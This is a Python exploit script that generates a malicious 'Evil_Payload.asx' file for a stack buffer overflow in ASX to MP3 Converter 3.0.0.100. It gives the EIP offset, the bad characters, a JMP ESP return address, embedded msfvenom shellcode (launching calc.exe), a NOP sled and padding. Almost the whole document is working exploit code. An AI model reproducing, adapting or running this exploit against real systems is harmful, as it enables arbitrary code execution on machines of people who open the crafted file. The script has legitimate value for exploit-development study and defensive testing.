#!/usr/bin/env python
#-------------------------------------------------------------------------------------------------------------#
# Software      = ASX to MP3 Converter Version 3.0.0.100                                                      #
# Download Link = https://www.exploit-db.com/apps/b31a84e79d9941d89336b6708ef52a20-ASXtoMP3Converter_3121.exe #
# Date          = 10/11/2017                                                                                  #
# Reference     = https://www.exploit-db.com/exploits/11930/                                                  #
# Author        = @ihack4falafel                                                                              #
# Tested on     = Windows XP SP3      - Professional                                                          #
#                 Windows 7  SP1      - Enterprise                                                            #
#                 Windows 8.1         - Enterprise                                                            #
#                 Windows 10 (64-bit) - Enterprise                                                            #                                                                                       #
# EIP Offset    = 17417                                                                                       #
# Badchars      = "\x00\x09\x0a"                                                                              #
# RET Address   = 0x1005dacf | "\xFF\xE4" | [MSA2Mfilter03.dll]                                               #
# Usage         = ASX to MP3 Converter > load > Evil_Payload.asx                                              #        
#-------------------------------------------------------------------------------------------------------------#

import struct
import time

#------------------------------------------------------------------------------#
# msfvenom -p windows/exec CMD=calc.exe -b "\x00\x09\x0a" -f python -v payload #
#------------------------------------------------------------------------------#

payload =  ""
payload += "\xdb\xdf\xd9\x74\x24\xf4\x5b\xbd\x9e\x16\x2c\x45"
payload += "\x33\xc9\xb1\x31\x31\x6b\x18\x03\x6b\x18\x83\xc3"
payload += "\x9a\xf4\xd9\xb9\x4a\x7a\x21\x42\x8a\x1b\xab\xa7"
payload += "\xbb\x1b\xcf\xac\xeb\xab\x9b\xe1\x07\x47\xc9\x11"
payload += "\x9c\x25\xc6\x16\x15\x83\x30\x18\xa6\xb8\x01\x3b"
payload += "\x24\xc3\x55\x9b\x15\x0c\xa8\xda\x52\x71\x41\x8e"
payload += "\x0b\xfd\xf4\x3f\x38\x4b\xc5\xb4\x72\x5d\x4d\x28"
payload += "\xc2\x5c\x7c\xff\x59\x07\x5e\x01\x8e\x33\xd7\x19"
payload += "\xd3\x7e\xa1\x92\x27\xf4\x30\x73\x76\xf5\x9f\xba"
payload += "\xb7\x04\xe1\xfb\x7f\xf7\x94\xf5\x7c\x8a\xae\xc1"
payload += "\xff\x50\x3a\xd2\xa7\x13\x9c\x3e\x56\xf7\x7b\xb4"
payload += "\x54\xbc\x08\x92\x78\x43\xdc\xa8\x84\xc8\xe3\x7e"
payload += "\x0d\x8a\xc7\x5a\x56\x48\x69\xfa\x32\x3f\x96\x1c"
payload += "\x9d\xe0\x32\x56\x33\xf4\x4e\x35\x59\x0b\xdc\x43"
payload += "\x2f\x0b\xde\x4b\x1f\x64\xef\xc0\xf0\xf3\xf0\x02"
payload += "\xb5\x0c\xbb\x0f\x9f\x84\x62\xda\xa2\xc8\x94\x30"
payload += "\xe0\xf4\x16\xb1\x98\x02\x06\xb0\x9d\x4f\x80\x28"
payload += "\xef\xc0\x65\x4f\x5c\xe0\xaf\x2c\x03\x72\x33\x9d"
payload += "\xa6\xf2\xd6\xe1"

#----------------------------#
#      Buffer Structure      #
#----------------------------#
# buffer = "http://"         # 
# buffer = AAA...........AAA #
# buffer = EIP - RET Address #
# buffer = NOPSled           #
# buffer = payload           #
# buffer = BBB...........BBB #
#----------------------------#

buffer =  "http://"
buffer += "A" * 17417
buffer += struct.pack('<L', 0x1005dacf)
buffer += "\x90" * 40
buffer += payload
buffer += "B" * (27000-7-17417-4-40-len(payload))

print "Creating %s bytes evil file.." %(len(buffer))
f=open("Evil_Payload.asx","w")
time.sleep(2)

try:   
  f.write(buffer)
  f.close()
  print "File created"
except:
  print "File cannot be created"
